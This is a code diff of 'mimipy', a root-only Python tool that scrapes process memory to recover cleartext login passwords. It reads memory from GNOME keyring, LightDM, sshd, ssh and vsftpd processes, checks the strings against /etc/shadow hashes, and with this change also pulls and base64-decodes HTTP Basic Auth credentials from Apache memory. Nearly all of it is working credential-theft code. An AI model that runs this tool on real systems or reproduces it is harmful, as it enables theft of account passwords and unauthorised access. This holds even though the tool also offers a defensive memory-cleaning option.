@@ -23,10 +23,22 @@ import argparse
 import logging
 import time
 import random
+import traceback
+import base64
 
+class VersionError(Exception):
+    pass
 
 try:
     from memorpy import *
+    try:
+        from memorpy.version import version as memorpy_version
+    except:
+        memorpy_version=(0,0)
+    if memorpy_version<(1,3):
+        logging.warning("memorpy version is too old, please update !")
+        raise VersionError("memorpy version is too old, please update !")
+        
 except ImportError as e:
     logging.warning("%s\ninstall with: \"pip install https://github.com/n1nj4sec/memorpy/archive/master.zip\""%e)
     raise e
@@ -34,28 +46,11 @@ except ImportError as e:
 LOOK_AFTER_SIZE=1000*10**3
 LOOK_BEFORE_SIZE=500*10**3
 
-rules = [
-    {
-        "type" : "[SYSTEM - GNOME]",
-        "process" : ["gnome-keyring-daemon", "gdm-password", "gdm-session-worker"],
-        "near" : r"libgcrypt\.so\..+|libgck\-1\.so\.0|_pammodutil_getpwnam_|gkr_system_authtok",
-    },
-    {
-        "type" : "[SYSTEM - LightDM]", # Ubuntu/xubuntu login screen :) https://doc.ubuntu-fr.org/lightdm
-        "process" : ["lightdm"],
-        "near" : r"_pammodutil_getpwnam_|gkr_system_authtok",
-    },
-    {
-        "type" : "[SYSTEM - SSH]",
-        "process" : ["sshd:"],
-        "near" : r"sudo.+",
-    },
-    {
-        "type" : "[SYSTEM - VSFTPD]",
-        "process" : ["vsftpd"],
-        "near" : r"^::.+\:[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$",
-    },
+HTTP_AUTH_REGEX = [
+    ("Basic", "(?:WWW-|Proxy-)?Authorization:\s+Basic\s+(?P<basic>[a-zA-Z0-9/\+]+={0,3})"), #TODO: digest, ntlm, ... hashes are still nice
+    #("GET/POST", "(email|log(in)?|user(name)?)=(?P<Login>[a-zA-Z0-9%_+*.:-]{1,25})?&.{0,10}?p[a]?[s]?[s]?[w]?[o]?[r]?[d]?=(?P<Password>[a-zA-Z0-9%_+*.:-]{1,25})&")
 ]
+
 
 
 def colorize(s, color="grey"):
@@ -91,14 +86,14 @@ def get_shadow_hashes():
     return hashes
 
 
-def memstrings(mw, start_offset=None, end_offset=None):
-    for _,x in mw.mem_search(r"[\x1f-\x7e]{6,50}[\x00]", ftype='re', start_offset=start_offset, end_offset=end_offset):
+def memstrings(mw, start_offset=None, end_offset=None, optimizations=''):
+    for _,x in mw.mem_search(r"([\x20-\x7e]{6,50})[^\x20-\x7e]", ftype='re', start_offset=start_offset, end_offset=end_offset, optimizations=optimizations):
         yield x
 
 
 
 passwords_found=set()
-def password_found(desc, user, process, password):
+def password_found(desc, process, user, password):
     global passwords_found
     if (process, user, password) not in passwords_found:
         passwords_found.add((process, user, password))
@@ -108,21 +103,25 @@ def password_found(desc, user, process, password):
         print colorize("\t- Password\t: %s"%password, color="grey")
 
 
-REGEX_TYPE=type(re.compile("^plop$"))
 def password_list_match(password_list, near):
     for passwd in password_list:
-        if type(near) == REGEX_TYPE:
-            if near.search(passwd):
-                return True
-        else:
-            if re.search(near, passwd):
-                return True
+        if near.search(passwd):
+            return True
     return False
+
+def cleanup_string(s):
+    ns=""
+    for c in s:
+        if ord(c)<0x20 or ord(c)>0x7e:
+            break
+        ns+=c
+    return ns
 
 def get_strings_around(mw, addr, string_at_addr, max_strings=30):
     strings_list=[]
+    logging.debug("looking for strings around %s from %s to %s"%(hex(addr), int(addr-LOOK_BEFORE_SIZE), int(addr-LOOK_AFTER_SIZE)))
     for o in memstrings(mw, start_offset=int(addr-LOOK_BEFORE_SIZE), end_offset=int(addr+LOOK_AFTER_SIZE)):
-        s=o.read(type='string', maxlen=51)
+        s=cleanup_string(o.read(type='string', maxlen=51, errors='ignore'))
         strings_list.append(s)
         if len(strings_list)>=30 and string_at_addr in strings_list[max_strings/2]:
             break
@@ -130,7 +129,7 @@ def get_strings_around(mw, addr, string_at_addr, max_strings=30):
             strings_list=strings_list[1:]
     return strings_list
 
-def search_password():
+def search_password(optimizations='nsrx'):
     import getpass
     mypasswd=getpass.getpass("search your password: ")
     for procdic in Process.list():
@@ -150,13 +149,12 @@ def search_password():
             #    print "strings found around : %s"%strings_list
             #    if not strings_list:
             #        x.dump(before=200, size=400)
-            for x in mw.mem_search(mypasswd):
-                print colorize("[+] password found in process %s (%s) at offset %s !"%(name, pid, hex(x)), color="green")
+            for x in mw.mem_search(mypasswd, optimizations=optimizations):
+                print colorize("[+] password found in process %s (%s) : %s !"%(name, pid, x), color="green")
+                x.dump(before=1000, size=2000)
                 print "strings found around : "
                 strings_list=get_strings_around(mw, x, mypasswd)
                 print "strings found around : %s"%strings_list
-                if not strings_list:
-                    x.dump(before=200, size=400)
                 #print "strings where the password's address is referenced :"
                 #for _,o in mw.search_address(x):
                 #    o.dump(before=200, size=400)
@@ -164,28 +162,49 @@ def search_password():
 
         except Exception as e:
             logging.error("Error scanning process %s (%s): %s"%(name, pid, e))
+            logging.debug(traceback.format_exc())
+
+def group_search(name, pid, rule, clean=False, cred_cb=None, optimizations='nsrx'):
+    logging.info("Analysing process %s (%s) for passwords ..."%(name, pid))
+    mw = MemWorker(name=name, pid=pid)
+            
+    for service, x in mw.mem_search(rule["groups"], ftype='ngroups', optimizations=None):
+        user=""
+        password=""
+        if "basic" in x:
+            try:
+                user, password=base64.b64decode(x).split(":",1)
+            except:
+                pass
+        elif "Login" in x and "Password" in x:
+            user=x["Login"]
+            password=x["Password"]
+        else:
+            password=str(x)
+            
+        yield (rule["desc"]+" "+service, user, password)
 
 
-def analyze_process(name, pid, rule, clean=False, cred_cb=None):
-    logging.info("Analysing process %s (%s) ..."%(name, pid))
+def test_shadow(name, pid, rule, clean=False, cred_cb=None, optimizations='nsrx'):
+    logging.info("Analysing process %s (%s) for shadow passwords ..."%(name, pid))
     password_tested=set() #to avoid hashing the same string multiple times
     mw=MemWorker(name=name, pid=pid)
     scanned_segments=[]
-    for _,match_addr in mw.mem_search(rule["near"], ftype='re'):
+    for _,match_addr in mw.mem_search(rule["near"], ftype='re', optimizations=optimizations):
         password_list=[]
         total=0
         start=int(match_addr-LOOK_AFTER_SIZE)
         end=int(match_addr+LOOK_AFTER_SIZE)
-        logging.debug("looking between offsets %s-%s"%(hex(start),hex(end)))
         for s,e in scanned_segments:
             if end < s or start > e:
                 continue #no collision
             elif start >=s and e >= start and end >= e:
                 logging.debug("%s-%s reduced to %s-%s"%(hex(start), hex(end), hex(e), hex(end)))
-                start=e-1000 #we only scan a smaller region because some of it has already been scanned
+                start=e-200 #we only scan a smaller region because some of it has already been scanned
+        logging.debug("looking between offsets %s-%s"%(hex(start),hex(end)))
         scanned_segments.append((start, end))
-        for x in memstrings(mw, start_offset=start, end_offset=end):
-            passwd=x.read(type='string', maxlen=51)
+        for x in memstrings(mw, start_offset=start, end_offset=end, optimizations=optimizations):
+            passwd=cleanup_string(x.read(type='string', maxlen=51, errors='ignore'))
             total+=1
             password_list.append(passwd)
             if len(password_list)>40:
@@ -196,29 +215,77 @@ def analyze_process(name, pid, rule, clean=False, cred_cb=None):
                         password_tested.add(p)
                         for user, h in shadow_hashes:
                             if crypt.crypt(p, h) == h:
-                                yield (rule["type"], user, p)
+                                yield (rule["desc"], user, p)
                                 if clean:
                                     logging.info("cleaning password from memory in proc %s at offset: %s ..."%(name, hex(x)))
                                     x.write("x"*len(p))
 shadow_hashes=[]
-def mimipy_loot_passwords():
+def mimipy_loot_passwords(clean=False, optimizations='nsrx'):
     global shadow_hashes
     shadow_hashes=get_shadow_hashes()
     for procdic in Process.list():
         name=procdic["name"]
         pid=int(procdic["pid"])
         for rule in rules:
-            for rp in rule["process"]:
-                if rp in name:
-                    start_time=time.time()
-                    try:
-                        for t, u, p in analyze_process(name, pid, rule, clean=args.clean):
-                            yield (t, name, u, p)
-                    except Exception as e:
-                        logging.warning("[-] %s"%e)
-                    finally:
-                        logging.info("Process %s analysed in %s seconds"%(name, int(time.time()-start_time)))
+            if re.search(rule["process"], name):
+                start_time=time.time()
+                try:
+                    for t, u, p in rule["func"](name, pid, rule, clean=clean, optimizations=optimizations):
+                        yield (t, name, u, p)
+                except Exception as e:
+                    logging.warning("[-] %s"%e)
+                    logging.debug(traceback.format_exc())
+                finally:
+                    logging.info("Process %s analysed in %s seconds"%(name, time.time()-start_time))
 
+rules = [
+    {
+        "desc" : "[SYSTEM - GNOME]",
+        "process" : r"gnome-keyring-daemon|gdm-password|gdm-session-worker",
+        "near" : r"libgcrypt\.so\..+|libgck\-1\.so\.0|_pammodutil_getpwnam_|gkr_system_authtok",
+		"func" : test_shadow,
+    },
+    {
+        "desc" : "[SYSTEM - LightDM]", # Ubuntu/xubuntu login screen :) https://doc.ubuntu-fr.org/lightdm
+        "process" : r"lightdm",
+        "near" : r"_pammodutil_getpwnam_|gkr_system_authtok",
+		"func" : test_shadow,
+    },
+    {
+        "desc" : "[SYSTEM - SSH Server]",
+        "process" : r"/sshd$",
+        "near" : r"sudo.+|_pammodutil_getpwnam_",
+		"func" : test_shadow,
+    },
+    {
+        "desc" : "[SSH Client]",
+        "process" : r"/ssh$",
+        "near" : r"sudo.+|/tmp/ICE-unix/[0-9]+",
+		"func" : test_shadow,
+    },
+    {
+        "desc" : "[SYSTEM - VSFTPD]",
+        "process" : r"vsftpd",
+        "near" : r"^::.+\:[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$",
+		"func" : test_shadow,
+    },
+    {
+        "desc" : "[HTTP]",
+        "process" : r"/apache2",
+		"func" : group_search,
+        "groups" : HTTP_AUTH_REGEX,
+    },
+]
+
+REGEX_TYPE=type(re.compile("^plop$"))
+#precompile regexes to optimize speed
+for x in rules:
+    if "near" in x:
+        if type(x["near"])!=REGEX_TYPE:
+            x["near"]=re.compile(x["near"])
+    if "process" in x:
+        if type(x["process"])!=REGEX_TYPE:
+            x["process"]=re.compile(x["process"])
 
 if __name__=="__main__":
     parser = argparse.ArgumentParser(description="""
@@ -231,6 +298,7 @@ if __name__=="__main__":
     """, formatter_class=argparse.RawTextHelpFormatter)
     parser.add_argument('--clean', action='store_true', help='@blueteams protect yourself and clean found passwords from memory ! You might want to regularly run this on your workstation/servers')
     parser.add_argument('-v', '--verbose', action='store_true', help='be more verbose !')
+    parser.add_argument('-n', '--no-optimize', action='store_true', help='disable optimisations (search the whole memory whatever region perms are) (slower)')
     parser.add_argument('-p', '--pid', type=int, help='choose the process\'s pid to scan instead of automatic selection')
     parser.add_argument('--search-password', action='store_true', help='prompt for your password and search it in all your processes !.')
     args = parser.parse_args()
@@ -247,9 +315,13 @@ if __name__=="__main__":
         logging.error("mimipy needs root ;)")
         exit(1)
 
-    
+    opt="nsrx"
+    if args.no_optimize:
+        logging.info("Optimizations disabled")
+        opt=''
+
     if args.search_password:
-        search_password()
+        search_password(optimizations=opt)
         exit(0)
 
     if args.pid:
@@ -260,15 +332,15 @@ if __name__=="__main__":
                 try:
                     start_time=time.time()
                     for rule in rules:
-                        analyze_process(name, pid, rule, clean=args.clean)
+                        rule["func"](name, pid, rule, clean=args.clean, optimizations=opt)
                 except Exception as e:
                     logging.warning("[-] %s"%e)
                 finally:
-                    logging.info("Process %s analysed in %s seconds"%(name, int(time.time()-start_time)))
+                    logging.info("Process %s analysed in %s seconds"%(name, time.time()-start_time))
     else:
-        for t, u, process, passwd in mimipy_loot_passwords():
-            password_found(t, u, process, passwd)
-    logging.info("Script executed in %s seconds"%int(time.time()-total_time))
+        for t, process, u, passwd in mimipy_loot_passwords(optimizations=opt, clean=args.clean):
+            password_found(t, process, u, passwd)
+    logging.info("Script executed in %s seconds"%(time.time()-total_time))
 
 
 
